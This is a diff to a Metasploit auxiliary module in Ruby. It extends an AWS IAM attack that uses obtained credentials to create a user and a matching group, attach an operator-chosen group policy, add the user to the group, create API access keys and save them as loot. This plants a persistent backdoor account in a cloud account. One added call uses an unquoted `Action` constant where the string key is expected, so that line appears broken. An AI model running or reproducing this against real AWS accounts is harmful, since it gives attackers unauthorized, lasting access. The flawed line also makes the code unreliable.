@@ -44,15 +44,41 @@ class MetasploitModule < Msf::Auxiliary
     datastore['RHOST'] = datastore['AWS_IAM_ENDPOINT']
     datastore['RPORT'] = datastore['AWS_IAM_ENDPOINT_PORT']
     datastore['SSL'] = datastore['AWS_IAM_ENDPOINT_SSL']
+
+    # create user
     username = datastore['IAM_USERNAME']
     print_status("Creating user: #{username}")
-    doc = call_iam('Action' => 'CreateUser', 'UserName' => username)
-    print_results(doc)
+    action = 'CreateUser'
+    doc = call_iam('Action' => action, 'UserName' => username)
+    print_results(doc, action)
+
+    # create group
     print_status("Creating group: #{username}")
-    doc = call_iam('Action' => 'CreateGroup', 'GroupName' => username)
-    print_results(doc)
+    action = 'CreateGroup'
+    doc = call_iam('Action' => action, 'GroupName' => username)
+    print_results(doc, action)
+
+    # create group policy
+    print_status("Creating group policy: #{username}")
     pol_doc = datastore['IAM_GROUP_POL']
-    call_iam('Action' => 'PutGroupPolicy', 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
+    action = 'PutGroupPolicy'
+    doc = call_iam('Action' => action, 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
+    print_results(doc, action)
+
+    # add user to group
+    print_status("Adding user (#{username}) to group: #{username}")
+    action = 'AddUserToGroup'
+    doc = call_iam(Action => action, 'UserName' => username, 'GroupName' => username)
+    print_results(doc, action)
+
+    # create API keys
+    print_status("Creating API Keys for #{username}")
+    action = 'CreateAccessKey'
+    doc = call_iam('Action' => action, 'UserName' => username)
+    print_results(doc, action)
+
+    path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
+    print_good("API keys stored at: " + path)
   end
 
   def tmp_creds
